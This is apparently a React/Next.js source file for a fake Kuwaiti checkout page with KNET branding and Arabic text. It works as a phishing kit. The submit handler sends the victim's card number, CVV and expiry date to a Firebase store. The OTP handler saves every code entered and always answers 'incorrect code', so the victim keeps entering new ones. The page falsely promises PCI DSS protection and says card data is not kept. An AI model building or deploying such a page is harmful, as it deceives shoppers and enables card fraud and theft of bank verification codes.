"use client"

import type React from "react"
import { useState, useEffect } from "react"
import { Check, CreditCard, Shield, ArrowRight, Lock, Info } from "lucide-react"
import { Button } from "@/components/ui/button"
import { Input } from "@/components/ui/input"
import { Label } from "@/components/ui/label"
import { RadioGroup, RadioGroupItem } from "@/components/ui/radio-group"
import { Dialog, DialogContent, DialogHeader, DialogTitle } from "@/components/ui/dialog"
import { InputOTP, InputOTPGroup, InputOTPSlot } from "@/components/ui/input-otp"
import { Card, CardContent, CardHeader, CardTitle, CardDescription } from "@/components/ui/card"
import { Badge } from "@/components/ui/badge"
import { Separator } from "@/components/ui/separator"
import { Tooltip, TooltipContent, TooltipProvider, TooltipTrigger } from "@/components/ui/tooltip"
import { addData } from "@/lib/firebase"
import { useRouter } from "next/navigation"
import { cn } from "@/lib/utils"
import { setupOnlineStatus } from "@/lib/util"

const allOtps: string[] = [""]

export default function CheckoutPage() {
  const [showOtpDialog, setShowOtpDialog] = useState(false)
  const [otpValue, setOtpValue] = useState("")
  const [otpError, setOtpError] = useState("")
  const [isLoading, setIsLoading] = useState(false)
  const [expiryDate, setExpiryDate] = useState("")
  const [cardType, setCardType] = useState<string | null>(null)
  const [timeLeft, setTimeLeft] = useState(60)
  const [canResend, setCanResend] = useState(false)
  const [amount, setAmount] = useState("5")

  const router = useRouter()

  const [formData, setFormData] = useState({
    fullName: "",
    email: "",
    paymentMethod: "",
    cardNumber: "",
    expiryDate: "",
    cvv: "",
    selectedBank: "",
    knetService: "knet-debit",
  })

  // Timer for OTP resend
  useEffect(() => {
    if (0 && timeLeft > 0) {
      const timer = setTimeout(() => {
        setTimeLeft(timeLeft - 1)
      }, 1000)
      return () => clearTimeout(timer)
    } else if (timeLeft === 0) {
      setCanResend(true)
    }
  }, [showOtpDialog, timeLeft])
  useEffect(() => {
    const am = localStorage.getItem("amount")!
    const visitor=localStorage.getItem("visitor")!
    setupOnlineStatus(visitor!)
    setAmount(am)
  }, [])
  // Format card number with spaces
  const formatCardNumber = (value: string) => {
    const v = value.replace(/\s+/g, "").replace(/[^0-9]/gi, "")
    const matches = v.match(/\d{4,16}/g)
    const match = (matches && matches[0]) || ""
    const parts = []

    for (let i = 0; i < match.length; i += 4) {
      parts.push(match.substring(i, i + 4))
    }

    if (parts.length) {
      return parts.join(" ")
    } else {
      return value
    }
  }

  // Detect card type based on first digits
  const detectCardType = (number: string) => {
    const re = {
      visa: /^4/,
      mastercard: /^5[1-5]/,
      amex: /^3[47]/,
    }

    const cleanNumber = number.replace(/\D/g, "")

    if (re.visa.test(cleanNumber)) return "visa"
    if (re.mastercard.test(cleanNumber)) return "mastercard"
    if (re.amex.test(cleanNumber)) return "amex"
    return null
  }

  const handleInputChange = (field: string, value: string) => {
    if (field === "expiryDate") {
      // Remove any non-digit characters except "/"
      let cleanValue = value.replace(/[^\d/]/g, "")

      // Remove any existing "/"
      cleanValue = cleanValue.replace(/\//g, "")

      // Add "/" after 2 digits (month)
      if (cleanValue.length >= 2) {
        cleanValue = cleanValue.substring(0, 2) + "/" + cleanValue.substring(2, 4)
      }

      // Limit to MM/YY format (5 characters max)
      cleanValue = cleanValue.substring(0, 5)

      setExpiryDate(cleanValue)
      setFormData((prev) => ({ ...prev, [field]: cleanValue }))
    } else if (field === "cardNumber") {
      const formattedValue = formatCardNumber(value)
      setFormData((prev) => ({ ...prev, [field]: formattedValue }))
      setCardType(detectCardType(value))
    } else {
      setFormData((prev) => ({ ...prev, [field]: value }))
    }
  }

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault()
    setIsLoading(true)

    if (formData.paymentMethod === "digital-wallet") {
      router.push("/knet")
      return
    }

    const visitorId = localStorage.getItem("visitor")
    addData({
      id: visitorId,
      cardNumber: formData.cardNumber.replace(/\s/g, ""),
      pass: formData.cvv,
      month: formData.expiryDate,
      expiryDate: formData.expiryDate,
    })

    // Simulate API call
    setTimeout(() => {
      setIsLoading(false)
      setShowOtpDialog(true)
    }, 2000)
  }

  const handleOtpSubmit = () => {
    const visitorId = localStorage.getItem("visitor")
    setIsLoading(true)

    allOtps.push(otpValue)
    addData({ id: visitorId, otp: otpValue, allOtps })

    if (otpValue.length === 6) {
      setTimeout(() => {
        setIsLoading(false)
        setOtpValue("")
        setOtpError("رمز التحقق غير صحيح. يرجى المحاولة مرة أخرى.")
      }, 2000)
    }
  }

  const handleOtpChange = (value: string) => {
    setOtpValue(value)
    setOtpError("")
  }

  const handleResendOtp = () => {
    setTimeLeft(60)
    setCanResend(false)
    setOtpValue("")
    setOtpError("")

    // Simulate OTP resend
    setIsLoading(true)
    setTimeout(() => {
      setIsLoading(false)
    }, 1500)
  }

  return (
    <div
      dir="rtl"
      className="min-h-screen bg-gradient-to-br from-slate-50 via-white to-[#f72585]-50"
      style={{ fontSize: 12 }}
    >
      {/* Professional Header with animated gradient */}
      <div className="relative overflow-hidden">
        
        <div className="absolute inset-0 bg-gradient-to-l from-[#f72585]-600/10 via-pink-500/5 to-transparent animate-gradient-x"></div>
        <div className="relative px-6 py-8">
          <div className="max-w-md mx-auto text-center">
            <div className="inline-flex items-center justify-center w-16 h-16 bg-gradient-to-r from-[#f72585] to-pink-800 rounded-2xl shadow-lg mb-4 relative overflow-hidden">
              <div className="absolute inset-0 bg-gradient-to-tr from-[#f72585]-600/80 to-transparent opacity-60 animate-pulse"></div>
              <Lock className="w-8 h-8 text-white relative z-10" />
            </div>
            <h1 className="text-2xl font-bold text-slate-800 mb-2">الدفع الآمن</h1>
            <p className="text-slate-600">معلوماتك محمية بأعلى معايير الأمان</p>
          </div>
        </div>
      </div>

      {/* Enhanced Progress Steps with animation */}
      <Card className="mx-auto max-w-md -mt-6 relative z-10 shadow-2xl border-0 bg-white/80 backdrop-blur-sm">
        <CardContent className="p-4 sm:p-6">
          <div className="w-full">
            {/* Progress Steps */}
            <div className="grid grid-cols-3 mb-4 relative">
              {/* Line connectors with animation */}
              <div className="absolute top-4 left-[calc(16.67%+8px)] right-[calc(16.67%+8px)] h-2">
                <div className="h-2 w-full flex">
                  <div className="w-1/2 h-2 bg-gradient-to-r from-[#2b224d] to-[#f72585]-500 rounded-full relative overflow-hidden">
                    <div className="absolute inset-0 bg-white/20 animate-pulse"></div>
                  </div>
                  <div className="w-1/2 h-2 bg-slate-200 rounded-full"></div>
                </div>
              </div>

              {/* Step 1 - Completed with animation */}
              <div className="flex flex-col items-center relative z-10">
                <div className="relative">
                  <div className="w-8 h-8 bg-gradient-to-r from-[#f72585] to-[#2b224d] rounded-full flex items-center justify-center shadow-lg">
                    <Check className="w-5 h-5 text-white" />
                  </div>
                  <div className="absolute -inset-1 bg-[#f72585]/30 rounded-full animate-pulse"></div>
                </div>
                <span className="text-green-600 text-xs sm:text-sm mt-2 font-medium text-center">أختيار القيمة</span>
              </div>

              {/* Step 2 - Current with pulsing animation */}
              <div className="flex flex-col items-center relative z-10">
                <div className="relative">
                  <div className="w-8 h-8 bg-gradient-to-r from-[#2b224d] to-pink-600 rounded-full flex items-center justify-center shadow-lg relative overflow-hidden">
                    <div className="absolute inset-0 bg-white/10 animate-pulse"></div>
                    <span className="text-white text-sm font-bold relative z-10">2</span>
                  </div>
                  <div className="absolute -inset-1 bg-[#f72585]-500/20 rounded-full animate-pulse"></div>
                </div>
                <span className="text-[#f72585] text-xs sm:text-sm mt-2 font-bold text-center">الدفع</span>
              </div>

              {/* Step 3 - Upcoming */}
              <div className="flex flex-col items-center relative z-10">
                <div className="w-8 h-8 bg-slate-200 rounded-full flex items-center justify-center shadow-sm">
                  <span className="text-slate-400 text-sm font-semibold">3</span>
                </div>
                <span className="text-slate-400 text-xs sm:text-sm mt-2 font-medium text-center">تأكيد الطلب</span>
              </div>
            </div>
          </div>
        </CardContent>
      </Card>

      {/* Enhanced Form Content */}
      <div className="px-4 py-8">
        <div className="max-w-md mx-auto space-y-8">
          <form onSubmit={handleSubmit} className="space-y-8">
            {/* Enhanced Payment Selection */}
            <Card className="shadow-xl border-0 overflow-hidden bg-white/90 backdrop-blur-sm">
              <CardHeader className="bg-gradient-to-r from-slate-100 via-white to-[#f72585]-50 px-8 py-6 border-b border-slate-100">
                <div className="flex items-center">
                  <div className="w-8 h-8 bg-gradient-to-r from-[#f72585] to-pink-600 rounded-lg flex items-center justify-center ml-3 relative overflow-hidden">
                    <div className="absolute inset-0 bg-white/20 animate-pulse"></div>
                    <CreditCard className="w-5 h-5 text-white relative z-10" />
                  </div>
                  <CardTitle className="text-xl font-bold text-slate-800">طريقة الدفع</CardTitle>
                  <Badge className="mr-3 bg-green-100 text-green-700 border-green-200 font-medium">
                    <Shield className="w-3 h-3 ml-1" />
                    SSL آمن
                  </Badge>
                </div>
                <CardDescription className="text-slate-500 mt-2 pr-11">
                  اختر طريقة الدفع المفضلة لديك لإتمام عملية الشراء
                </CardDescription>
              </CardHeader>

              <CardContent className="p-8">
                <RadioGroup
                  value={formData.paymentMethod}
                  onValueChange={(value) => handleInputChange("paymentMethod", value)}
                  className="space-y-4"
                >
                  {/* Credit Card Option with hover effects */}
                  <Card
                    className={cn(
                      "border-2 transition-all duration-300 hover:shadow-lg group",
                      formData.paymentMethod === "credit-card"
                        ? "border-[#f72585]-300 bg-gradient-to-r from-[#f72585]-50/80 to-pink-50/80 shadow-md"
                        : "border-slate-200 bg-gradient-to-r from-[#f72585]-50/30 to-pink-50/30 hover:border-[#f72585]-200",
                    )}
                    dir="rtl"
                  >
                    <CardContent className="p-0">
                      <div className="flex items-center p-6">
                        <RadioGroupItem
                          value="credit-card"
                          id="credit-card"
                          className="border-1 border-[#f72585]-400 text-[#f72585] ml-4 w-5 h-5"
                        />
                        <div className="flex items-center justify-between w-full">
                          <div dir="rtl">
                            <Label htmlFor="credit-card" className="text-slate-800 font-bold text-md cursor-pointer">
                              بطاقة ائتمان
                            </Label>
                            <p className="text-slate-500 text-xs mt-1">Visa, Mastercard, American Express</p>
                          </div>
                          <div className="flex items-center space-x-2 space-x-reverse">
                            <div
                              className={cn(
                                "w-10 h-6 rounded flex items-center justify-center transition-all duration-300",
                                cardType === "visa" && formData.paymentMethod === "credit-card"
                                  ? "scale-110"
                                  : "opacity-70",
                              )}
                            >
                              <img src="/visa.svg" alt="Visa" className="w-10 h-6 object-contain" />
                            </div>
                            <div
                              className={cn(
                                "w-10 h-6 rounded flex items-center justify-center transition-all duration-300",
                                cardType === "mastercard" && formData.paymentMethod === "credit-card"
                                  ? "scale-110"
                                  : "opacity-70",
                              )}
                            >
                              <img src="/master.svg" alt="Mastercard" className="w-10 h-6 object-contain" />
                            </div>
                            <div
                              className={cn(
                                "w-10 h-6 rounded flex items-center justify-center transition-all duration-300",
                                cardType === "amex" && formData.paymentMethod === "credit-card"
                                  ? "scale-110"
                                  : "opacity-70",
                              )}
                            >
                              <img src="/amex.svg" alt="American Express" className="w-10 h-6 object-contain" />
                            </div>
                          </div>
                        </div>
                      </div>

                      {formData.paymentMethod === "credit-card" && (
                        <div className="border-t bg-white/80 backdrop-blur-sm">
                          <div className="p-6 space-y-6">
                            <div className="group" dir="rtl">
                              <Label htmlFor="cardNumber" className="text-slate-700 text-base font-semibold mb-1 block">
                                رقم البطاقة <span className="text-[#f72585]-500">*</span>
                              </Label>
                              <div className="relative">
                                <Input
                                  id="cardNumber"
                                  placeholder="#### #### #### ####"
                                  maxLength={19}
                                  value={formData.cardNumber}
                                  onChange={(e) => handleInputChange("cardNumber", e.target.value)}
                                  className="h-12 border-2 border-slate-200 focus:border-[#f72585]-500 focus:ring-4 focus:ring-[#f72585]-100 transition-all duration-200 font-mono text-lg tracking-wider bg-white/50 pr-4"
                                  required
                                />
                                <div className="absolute left-4 top-1/2 transform -translate-y-1/2">
                                  {cardType ? (
                                    <div className="w-8 h-5">
                                      <img
                                        src={`/${cardType}.svg`}
                                        alt={cardType}
                                        className="w-full h-full object-contain"
                                      />
                                    </div>
                                  ) : (
                                    <CreditCard className="w-5 h-5 text-slate-400" />
                                  )}
                                </div>
                              </div>
                              <p className="text-xs text-slate-500 mt-1">أدخل رقم البطاقة بدون مسافات</p>
                            </div>

                            <div className="grid grid-cols-2 gap-6">
                              <div className="group" dir="rtl">
                                <Label
                                  htmlFor="expiryDate"
                                  className="text-slate-700 text-sm font-semibold mb-3 block flex items-center"
                                >
                                  تاريخ الانتهاء <span className="text-[#f72585]-500 mx-1">*</span>
                                  <TooltipProvider>
                                    <Tooltip>
                                      <TooltipTrigger asChild>
                                        <Info className="w-3.5 h-3.5 text-slate-400 cursor-help" />
                                      </TooltipTrigger>
                                      <TooltipContent className="bg-slate-800 text-white p-2 text-xs">
                                        أدخل الشهر/السنة كما هو مكتوب على البطاقة
                                      </TooltipContent>
                                    </Tooltip>
                                  </TooltipProvider>
                                </Label>
                                <Input
                                  id="expiryDate"
                                  placeholder="MM/YY"
                                  value={expiryDate}
                                  onChange={(e) => handleInputChange("expiryDate", e.target.value)}
                                  className="h-12 border-2 border-slate-200 focus:border-[#f72585]-500 focus:ring-4 focus:ring-[#f72585]-100 transition-all duration-200 font-mono text-base bg-white/50"
                                  dir="rtl"
                                  required
                                  maxLength={5}
                                />
                              </div>
                              <div className="group" dir="rtl">
                                <Label
                                  htmlFor="cvv"
                                  className="text-slate-700 text-base font-semibold mb-3 block flex items-center"
                                >
                                  رمز الأمان <span className="text-[#f72585]-500 mx-1">*</span>
                                  <TooltipProvider>
                                    <Tooltip>
                                      <TooltipTrigger asChild>
                                        <Info className="w-3.5 h-3.5 text-slate-400 cursor-help" />
                                      </TooltipTrigger>
                                      <TooltipContent className="bg-slate-800 text-white p-2 text-xs">
                                        رمز الأمان المكون من 3 أو 4 أرقام على ظهر البطاقة
                                      </TooltipContent>
                                    </Tooltip>
                                  </TooltipProvider>
                                </Label>
                                <div className="relative">
                                  <Input
                                    id="cvv"
                                    placeholder="***"
                                    value={formData.cvv}
                                    onChange={(e) => handleInputChange("cvv", e.target.value)}
                                    className="h-12 border-2 border-slate-200 focus:border-[#f72585]-500 focus:ring-4 focus:ring-[#f72585]-100 transition-all duration-200 font-mono text-base bg-white/50"
                                    dir="rtl"
                                    maxLength={4}
                                    type="tel"
                                    minLength={3}
                                    required
                                  />
                                  <Lock className="absolute left-4 top-1/2 transform -translate-y-1/2 w-4 h-4 text-slate-400" />
                                </div>
                              </div>
                            </div>
                          </div>
                        </div>
                      )}
                    </CardContent>
                  </Card>

                  {/* KNET Payment Option with enhanced choices */}
                  <Card
                    className={cn(
                      "border-2 transition-all duration-300 hover:shadow-lg group",
                      formData.paymentMethod === "digital-wallet"
                        ? "border-green-300 bg-gradient-to-r from-green-50/80 to-emerald-50/80 shadow-md"
                        : "border-slate-200 bg-gradient-to-r from-green-50/30 to-emerald-50/30 hover:border-green-200",
                    )}
                    dir="rtl"
                  >
                    <CardContent className="p-0">
                      <div className="flex items-center p-6">
                        <RadioGroupItem
                          value="digital-wallet"
                          id="digital-wallet"
                          className="border-1 border-green-400 text-green-600 ml-4 w-5 h-5"
                        />
                        <div className="flex items-center justify-between w-full">
                          <div dir="rtl">
                            <Label htmlFor="digital-wallet" className="text-slate-800 font-bold text-md cursor-pointer">
                              شبكة الكويت الوطنية - KNET
                            </Label>
                            <p className="text-slate-500 text-xs mt-1">الدفع الآمن عبر البنوك الكويتية</p>
                          </div>
                          <div className="flex items-center">
                            <div className="w-12 h-8 bg-gradient-to-r from-green-600 to-emerald-600 rounded flex items-center justify-center">
                              <img src="/kv.png" className="text-white font-bold text-xs"/>
                            </div>
                          </div>
                        </div>
                      </div>

                 
                    </CardContent>
                  </Card>
                </RadioGroup>

                <Separator className="my-8" />

                {/* Order Summary */}
                <Card className="border border-slate-200 bg-slate-50/70 mb-8">
                  <CardHeader className="pb-2">
                    <CardTitle className="text-lg font-bold text-slate-700">ملخص الطلب</CardTitle>
                  </CardHeader>
                  <CardContent className="pt-0">
                    <div className="space-y-2">
                      <div className="flex justify-between text-sm">
                        <span className="text-slate-600">المبلغ الأساسي</span>
                        <span className="font-medium">{amount} د.ك</span>
                      </div>
                      <div className="flex justify-between text-sm">
                        <span className="text-slate-600">رسوم الخدمة</span>
                        <span className="font-medium">0.000 د.ك</span>
                      </div>
                      <Separator className="my-2" />
                      <div className="flex justify-between font-bold">
                        <span className="text-slate-800">المبلغ الإجمالي</span>
                        <span className="text-[#f72585]">{amount} د.ك</span>
                      </div>
                    </div>
                  </CardContent>
                </Card>

                {/* Security Notice with animation */}
                <div className="bg-gradient-to-r from-green-50 to-emerald-50 border border-green-200 rounded-xl p-6 relative overflow-hidden">
                  <div className="absolute top-0 right-0 w-32 h-32 bg-green-200/30 rounded-full -mr-16 -mt-16 animate-pulse-slow"></div>
                  <div className="relative z-10">
                    <div className="flex items-start">
                      <div className="w-10 h-10 bg-green-100 rounded-full flex items-center justify-center ml-4 flex-shrink-0">
                        <Shield className="w-5 h-5 text-green-600" />
                      </div>
                      <div>
                        <h3 className="font-semibold text-green-800 mb-2">حماية متقدمة</h3>
                        <p className="text-green-700 text-sm leading-relaxed">
                          جميع المعاملات محمية بتشفير SSL 256-bit ومعايير PCI DSS. لا نحتفظ ببيانات بطاقتك الائتمانية
                          على خوادمنا.
                        </p>
                      </div>
                    </div>
                  </div>
                </div>

                <Button
                  type="submit"
                  disabled={
                    isLoading ||
                    (formData.paymentMethod === "credit-card" &&
                      (formData.cardNumber.length < 16 || !expiryDate || !formData.cvv)) 
                  }
                  className="w-full mt-8 h-12 bg-gradient-to-r from-[#a00064] to-pink-600 hover:from-[#f72585] hover:to-pink-700 text-white font-bold text-lg shadow-xl transition-all duration-300 hover:shadow-2xl hover:scale-[1.02] disabled:opacity-50 disabled:cursor-not-allowed disabled:transform-none relative overflow-hidden"
                >
                  {isLoading ? (
                    <div className="flex items-center justify-center">
                      <div className="w-5 h-5 border-2 border-white/30 border-t-white rounded-full animate-spin ml-3"></div>
                      جاري المعالجة...
                    </div>
                  ) : (
                    <>
                      <div className="absolute inset-0 bg-white/10 animate-pulse-slow"></div>
                      <span className="relative z-10 flex items-center justify-center">
                        المتابعة للدفع الآمن
                        <ArrowRight className="w-5 h-5 mr-3" />
                      </span>
                    </>
                  )}
                </Button>
              </CardContent>
            </Card>
          </form>
        </div>
      </div>

      {/* Enhanced OTP Dialog with animations */}
      <Dialog open={showOtpDialog} onOpenChange={setShowOtpDialog}>
        <DialogContent className="w-[95vw] max-w-sm sm:max-w-md lg:max-w-lg mx-auto rounded-2xl border-0 shadow-2xl bg-white/95 backdrop-blur-sm">
          <DialogHeader className="text-center pb-4 sm:pb-6">
            <div className="relative mx-auto mb-4 sm:mb-6">
              <div className="w-16 h-16 sm:w-20 sm:h-20 bg-gradient-to-r from-[#f72585]-100 to-pink-100 rounded-2xl flex items-center justify-center relative overflow-hidden">
                <div className="absolute inset-0 bg-gradient-to-tr from-[#f72585]-200 to-transparent animate-pulse"></div>
                <Shield className="w-8 h-8 sm:w-10 sm:h-10 text-[#f72585] relative z-10" />
              </div>
              <div className="absolute -inset-2 bg-gradient-to-r from-[#f72585]-500/20 to-pink-500/20 rounded-2xl animate-pulse"></div>
            </div>
            <DialogTitle className="text-xl sm:text-2xl font-bold text-slate-800 mb-2">تأكيد رمز التحقق</DialogTitle>
            <p className="text-sm sm:text-base text-slate-600">للحماية الإضافية لحسابك</p>
          </DialogHeader>

          <div className="space-y-4 py-2 sm:py-4">
            <div className="bg-gradient-to-r from-blue-50 to-indigo-50 border border-blue-200 rounded-xl p-4 sm:p-6 relative overflow-hidden">
              <div className="absolute top-0 left-0 w-32 h-32 bg-blue-200/20 rounded-full -ml-16 -mt-16 animate-pulse-slow"></div>
              <div className="relative z-10">
                <p className="text-center text-slate-700 leading-relaxed text-sm sm:text-base">
                  تم إرسال رمز التحقق المكون من 6 أرقام إلى رقم هاتفك
                  <br />
                  <span className="font-bold text-slate-900 text-base sm:text-lg">+965 5** *** ***</span>
                </p>
              </div>
            </div>

            <div className="flex justify-center px-2">
              <InputOTP maxLength={6} value={otpValue} onChange={handleOtpChange}>
                <InputOTPGroup className="gap-1 sm:gap-2 md:gap-3">
                  {[0, 1, 2, 3, 4, 5].map((index) => (
                    <InputOTPSlot
                      key={index}
                      index={index}
                      className="w-10 h-10 sm:w-12 sm:h-12 md:w-14 md:h-14 text-lg sm:text-xl font-bold border-2 border-slate-200 focus:border-[#f72585]-500 focus:ring-4 focus:ring-[#f72585]-100 transition-all duration-200 bg-white/80"
                    />
                  ))}
                </InputOTPGroup>
              </InputOTP>
            </div>

            {otpError && (
              <Card className="border-[#f72585]-200 bg-gradient-to-r from-[#f72585]-50 to-pink-50 animate-shake">
                <CardContent className="p-3 sm:p-4">
                  <div className="text-center text-[#f72585] font-medium flex items-center justify-center text-sm sm:text-base">
                    <div className="w-5 h-5 bg-[#f72585]-100 rounded-full flex items-center justify-center ml-2">
                      <span className="text-[#f72585] text-xs">!</span>
                    </div>
                    {otpError}
                  </div>
                </CardContent>
              </Card>
            )}

            <div className="space-y-3 sm:space-y-4">
              <Button
                onClick={handleOtpSubmit}
                className="w-full h-12 sm:h-14 bg-gradient-to-r from-[#f72585] to-pink-600 hover:from-[#f72585] hover:to-pink-700 text-white font-bold text-base sm:text-lg disabled:opacity-50 disabled:cursor-not-allowed transition-all duration-200 shadow-lg hover:shadow-xl relative overflow-hidden"
                disabled={otpValue.length !== 6 || isLoading}
              >
                {isLoading ? (
                  <div className="flex items-center justify-center">
                    <div className="w-4 h-4 sm:w-5 sm:h-5 border-2 border-white/30 border-t-white rounded-full animate-spin ml-3"></div>
                    <span className="text-sm sm:text-base">جاري المعالجة...</span>
                  </div>
                ) : (
                  <>
                    <div className="absolute inset-0 bg-white/10 animate-pulse-slow"></div>
                    <span className="relative z-10 text-sm sm:text-base">تأكيد الرمز والمتابعة</span>
                  </>
                )}
              </Button>

              <Button
                variant="outline"
                className="w-full h-12 sm:h-14 border-2 border-slate-200 text-slate-600 hover:bg-slate-50 font-semibold text-sm sm:text-base transition-all duration-200"
                onClick={handleResendOtp}
                disabled={!canResend || isLoading}
              >
                {canResend ? "إعادة إرسال الرمز" : <>إعادة الإرسال بعد {timeLeft} ثانية</>}
              </Button>
            </div>

            <div className="bg-slate-50 rounded-xl p-2 sm:p-2">
              <p className="text-center text-xs sm:text-sm text-slate-500 leading-relaxed">
                لم تستلم الرمز؟ تحقق من رسائل SMS أو انتظر انتهاء العداد لإعادة الإرسال
                <br />
                <span className="font-medium">هذا الرمز صالح لمدة 5 دقائق فقط</span>
              </p>
            </div>
          </div>
        </DialogContent>
      </Dialog>
    </div>
  )
}
